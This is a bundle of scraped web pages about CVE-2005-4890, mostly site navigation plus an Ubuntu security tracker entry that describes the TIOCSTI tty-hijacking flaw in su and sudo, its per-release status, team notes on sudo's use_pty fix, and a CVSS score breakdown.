  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from duckduckgo.com_ffed86b2_20250126_050050.html ===


[DuckDuckGo](/html/)

Unfortunately, bots use DuckDuckGo too.
Please complete the following challenge to confirm this search was made by a human.
Select all squares containing a duck:

![ ](../assets/anomaly/images/challenge/efb9e03dea9c46f9a941639244745e40.jpg)

![ ](../assets/anomaly/images/challenge/3a92d77ea1c647b1b68905d12e2c6beb.jpg)

![ ](../assets/anomaly/images/challenge/23c1e3ae8ce8443183e624800acf2f47.jpg)

![ ](../assets/anomaly/images/challenge/6e2ca83055254255b64c2777c91b6c1e.jpg)

![ ](../assets/anomaly/images/challenge/2cf1c84b886c4c339792bd8029da27bc.jpg)

![ ](../assets/anomaly/images/challenge/07633caf09784bf483d94daf3b05ab41.jpg)

![ ](../assets/anomaly/images/challenge/7e27eab795fb47fe9cb9051615e56186.jpg)

![ ](../assets/anomaly/images/challenge/c77e30df86594ddaa9d43dcac463d34f.jpg)

![ ](../assets/anomaly/images/challenge/ee4c07e9c7db4f04a78d73d17afb3521.jpg)

Submit
Images not loading?
Please email the following code to:

error-lite@duckduckgo.com

Code: d4cd0dabcf4caa22ad92fab40844c786

![](//duckduckgo.com/t/tqadb?5687579&s=lite&r=eun&e=0&i=-1&o=QxKl%2FQ20%2FOJZuhPgxOxQfYMpdMrR6Hs%2FGIf5NcoffhiYPDPoi7a89QIWE3SERi9Z%0A&p=efb9e03dea9c46f9a941639244745e40-3a92d77ea1c647b1b68905d12e2c6beb-23c1e3ae8ce8443183e624800acf2f47-6e2ca83055254255b64c2777c91b6c1e-2cf1c84b886c4c339792bd8029da27bc-07633caf09784bf483d94daf3b05ab41-7e27eab795fb47fe9cb9051615e56186-c77e30df86594ddaa9d43dcac463d34f-ee4c07e9c7db4f04a78d73d17afb3521&iadb=0&gk=d4cd0dabcf4caa22ad92fab40844c786&cc=botnet&sc=1&c=dadb)


=== Content from bugs.gentoo.org_bce8dd5e_20250126_050054.html ===

[![Gentoo Websites Logo](extensions/Gentoo/web/gentoo_org.png)](/ "Go to the Gentoo Bugzilla homepage")
Go to:
[Gentoo Home](https://www.gentoo.org/)
[Documentation](https://www.gentoo.org/support/documentation/)
[Forums](https://forums.gentoo.org/)
[Lists](https://www.gentoo.org/get-involved/mailing-lists/)
[Bugs](/)
[Planet](https://planet.gentoo.org/)
[Store](https://www.gentoo.org/inside-gentoo/stores/)
[Wiki](https://wiki.gentoo.org/)
**[Get Gentoo!](https://www.gentoo.org/downloads/)**

Gentoo's Bugzilla – Invalid Bug ID

* [Home](./)
* | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=CVE-2005-4890&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=CVE-2005-4890&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

'CVE-2005-4890' is not a valid bug number
nor an alias to a bug.

Please press **Back** and try again.

* + [Home](./)
  + | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=CVE-2005-4890&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=CVE-2005-4890&GoAheadAndLogIn=1#forgot)
    Login:

    [x]



=== Content from access.redhat.com_de4f7b28_20250126_050017.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from people.canonical.com_a288a3b3_20250126_050043.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# CVE-2005-4890

Publication date 4 November 2019

Last updated 24 July 2024

---

Ubuntu priority

![](https://assets.ubuntu.com/v1/03ac6f86-CVE-Priority-icon-Low.svg)

**Low**

[Why this priority?](/security/cves/about#priority )

## Cvss 3 Severity Score

![](https://assets.ubuntu.com/v1/3887354e-CVE-Priority-icon-High.svg)

**7.8 · High**

[Score breakdown](#impact-score)

Toggle side navigation

Toggle table of contents

* [Description](#description)
* [Status](#status)
* [Notes](#notes)
* [Severity score breakdown](#impact-score)
* [References](#references)

There is a possible tty hijacking in shadow 4.x before 4.1.5 and sudo 1.x
before 1.7.4 via "su - user -c program". The user session can be escaped to
the parent session by using the TIOCSTI ioctl to push characters into the
input buffer to be read by the next process.

[Read the notes from the security team](#notes)

## Status

Show unmaintained releases

| Package | Ubuntu Release | Status |
| --- | --- | --- |
| shadow | 21.04 hirsute | Not affected |
| 20.10 groovy | Not affected |
| 20.04 LTS focal | Not affected |
| 19.10 eoan | Not affected |
| 19.04 disco | Not affected |
| 18.10 cosmic | Not affected |
| 18.04 LTS bionic | Not affected |
| 17.10 artful | Not affected |
| 17.04 zesty | Not affected |
| 16.10 yakkety | Not affected |
| 16.04 LTS xenial | Not affected |
| 15.10 wily | Not affected |
| 15.04 vivid | Not affected |
| 14.10 utopic | Not affected |
| 14.04 LTS trusty | Not affected |
| 13.10 saucy | Ignored end of life |
| 13.04 raring | Ignored end of life |
| 12.10 quantal | Ignored end of life |
| 12.04 LTS precise | Ignored end of life |
| 11.10 oneiric | Ignored end of life |
| 11.04 natty | Ignored end of life |
| 10.10 maverick | Ignored end of life |
| 10.04 LTS lucid | Ignored end of life |
| 8.04 LTS hardy | Ignored end of life |
| sudo | 21.04 hirsute | Not affected |
| 20.10 groovy | Not affected |
| 20.04 LTS focal | Not affected |
| 19.10 eoan | Not affected |
| 19.04 disco | Not affected |
| 18.10 cosmic | Not affected |
| 18.04 LTS bionic | Not affected |
| 17.10 artful | Not affected |
| 17.04 zesty | Not affected |
| 16.10 yakkety | Not affected |
| 16.04 LTS xenial | Not affected |
| 15.10 wily | Not affected |
| 15.04 vivid | Not affected |
| 14.10 utopic | Not affected |
| 14.04 LTS trusty | Not affected |
| 13.10 saucy | Not affected |
| 13.04 raring | Not affected |
| 12.10 quantal | Not affected |
| 12.04 LTS precise | Not affected |
| 11.10 oneiric | Ignored end of life |
| 11.04 natty | Ignored end of life |
| 10.10 maverick | Ignored end of life |
| 10.04 LTS lucid | Ignored end of life |
| 8.04 LTS hardy | Ignored end of life |

---

* [How can I get the fixes?](/security/cves/about#security)
* [What do statuses mean?](/security/cves/about#statuses)
* [Patch details](#patch-details)

## Notes

---

### [mdeslaur](https://launchpad.net/~mdeslaur)

sudo is also apprently vulnerable to this, so the use\_pty
option was added. We need to verify versions, and make sure
it is actually getting honored (apparently the option wasn't
working: http://www.openwall.com/lists/oss-security/2011/06/22/4)

---

### [jdstrand](https://launchpad.net/~jdstrand)

sudo in 12.04 and higher has the fix for use\_pty. A small patch
(http://www.sudo.ws/repos/sudo/rev/8d95a163dfc1) can be used to enable it
on Ubuntu 11.04 and 11.10.

---

### [mdeslaur](https://launchpad.net/~mdeslaur)

Please note that use\_pty is not enabled by default in sudo, it
must be specifically enabled.

---

### [seth-arnold](https://launchpad.net/~seth-arnold)

su interactive has the same problem, no fix known on 20130305

### Patch details

For informational purposes only. We recommend not to cherry-pick updates. [How can I get the fixes?](/security/cves/about#security)

| Package | Patch details |
| --- | --- |
| sudo | * Upstream:   <http://www.sudo.ws/repos/sudo/rev/aea971f1456a> * Upstream:   <http://www.sudo.ws/repos/sudo/rev/e7b167f8a6e5> * Upstream:   <http://www.sudo.ws/repos/sudo/rev/26120a59c20e> * Upstream:   <http://www.sudo.ws/repos/sudo/rev/8d95a163dfc1> |

## Severity score breakdown

| Parameter | Value |
| --- | --- |
| Base score | 7.8 · High |
| Attack vector | Local |
| Attack complexity | Low |
| Privileges required | Low |
| User interaction | None |
| Scope | Unchanged |
| Confidentiality | High |
| Integrity impact | High |
| Availability impact | High |
| Vector | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |

## References

* [MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4890)
* [NVD](https://nvd.nist.gov/vuln/detail/CVE-2005-4890)
* [Launchpad](https://launchpad.net/bugs/cve/CVE-2005-4890)
* [Debian](https://security-tracker.debian.org/tracker/CVE-2005-4890)

### Other references

* <http://www.openwall.com/lists/oss-security/2011/06/02/3>
* <http://www.openwall.com/lists/oss-security/2012/11/05/8>
* <http://www.ush.it/2009/01/06/25c3-ccc-congress-2008-tricks-makes-you-smile/>
* <http://www.redhat.com/archives/fedora-devel-list/2004-July/msg01314.html>
* <https://www.cve.org/CVERecord?id=CVE-2005-4890>

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from www.openwall.com_f94e2b44_20250125_011811.html ===


